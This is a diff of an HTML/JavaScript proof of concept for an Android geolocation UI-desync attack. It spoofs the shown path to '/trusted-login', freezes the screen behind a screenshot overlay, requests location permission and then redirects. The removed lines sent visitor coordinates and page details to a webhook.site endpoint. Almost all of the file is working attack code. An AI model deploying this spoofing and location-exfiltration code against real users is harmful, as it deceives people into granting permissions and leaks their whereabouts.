@@ -3,8 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
-<title>Advanced Geo UI Desync PoC</title>
+<title>Android Geo Desync PoC</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
@@ -32,99 +31,80 @@ button {
 <button id="start">Start Demo</button>
 
 <script>
-const LOG = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+const TARGET = "https://google.com";
 
-function log(type, extra={}) {
-  const data = {
-    type,
-    t: performance.now(),
-    url: location.href,
-    origin: location.origin,
-    vis: document.visibilityState,
-    ...extra
-  };
-  new Image().src = LOG + "?" + new URLSearchParams(data);
+// logging optional
+function log(type){
+  console.log(type);
 }
 
-function requestGeo() {
-  log("geo_request");
-
-  navigator.geolocation.getCurrentPosition(
-    pos => log("geo_success", {
-      lat: pos.coords.latitude,
-      lon: pos.coords.longitude
-    }),
-    err => log("geo_error", {code: err.code})
-  );
-}
-
+// freeze UI
 function freezeUI() {
-  html2canvas(document.body,{
-    scale:2,
-    useCORS:true
-  }).then(canvas => {
-
+  return html2canvas(document.body,{scale:2}).then(canvas=>{
     const img = document.createElement("img");
-    img.src = canvas.toDataURL("image/png");
-
+    img.src = canvas.toDataURL();
     Object.assign(img.style,{
       position:"fixed",
       top:"0",
       left:"0",
       width:"100vw",
       height:"100vh",
-      objectFit:"cover",
       zIndex:"999999"
     });
-
     document.body.innerHTML="";
     document.body.appendChild(img);
-
-    log("ui_frozen");
   });
 }
 
+// request location
+function requestGeo() {
+  navigator.geolocation.getCurrentPosition(
+    () => {
+      log("granted");
+      location.replace(TARGET);
+    },
+    () => {
+      log("denied");
+    }
+  );
+}
+
+// 🔥 detect user kembali dari settings
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "visible") {
+    log("back_from_settings");
+
+    // cek permission lagi
+    navigator.permissions?.query({name:'geolocation'}).then(res=>{
+      if(res.state === "granted"){
+        location.replace(TARGET);
+      }
+    });
+  }
+});
+
+// start
 document.getElementById("start").onclick = () => {
 
-  log("click");
-
-  // 1. Fullscreen
+  // fullscreen
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen();
   }
 
-  // 2. Spoof path
+  // spoof path
   history.replaceState({}, '', '/trusted-login');
-  log("url_spoofed");
 
-  // 3. Trigger permission
-  requestGeo();
+  // freeze UI dulu
+  freezeUI().then(()=>{
 
-  // 4. Race chain
-  Promise.resolve().then(()=>{
-    requestAnimationFrame(()=>{
-      requestAnimationFrame(()=>{
+    // delay dikit biar overlay ready
+    setTimeout(()=>{
+      requestGeo();
+    },100);
 
-        log("before_redirect");
-
-        // 5. Freeze UI (biar user lihat trusted state)
-        freezeUI();
-
-        // 6. Redirect (race)
-        setTimeout(()=>{
-          location.replace("https://google.com:9090");
-        },50);
-
-      });
-    });
   });
-
 };
 
-// extra visibility tracking
-document.addEventListener("visibilitychange",()=>{
-  log("visibility_change",{state:document.visibilityState});
-});
 </script>
 
 </body>
